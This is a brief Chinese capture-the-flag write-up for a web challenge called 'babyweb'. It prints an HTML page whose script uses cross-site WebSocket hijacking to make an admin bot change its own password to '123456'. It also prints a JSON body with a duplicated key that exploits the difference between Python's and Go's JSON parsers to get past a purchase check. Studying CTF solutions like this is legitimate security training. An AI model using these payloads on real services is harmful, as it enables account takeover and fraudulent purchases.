---
tags: [WebSocket, CSRF, 越权, JSON解析差异, Python, Golang, 逻辑漏洞]
---

# babyweb

让admin自己修改自己密码， vps内容如下：

```
<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title></title>
</head>
<body>
<button id="btn" type="button">点我发送请求</button>
</body>
<script type="text/javascript" src="js/jquery.js" ></script>
<script>

ws = new WebSocket("ws://127.0.0.1:8888/bot");
ws.onopen = function () {
var msg = "changepw 123456";
ws.send(msg);
document.getElementById("sendbox").value = "";
document.getElementById("chatbox").append("你 : " + msg + "\r\n");
}
</script>
</html>
```

然后登录购买hint，代码审计，根据python go的json解析不一致绕过即可。

```
{"product":[{"id":1,"num":0},{"id":2,"num":0}],"product":[{"id":1,"num":3},
{"id":2,"num":3}]}
```

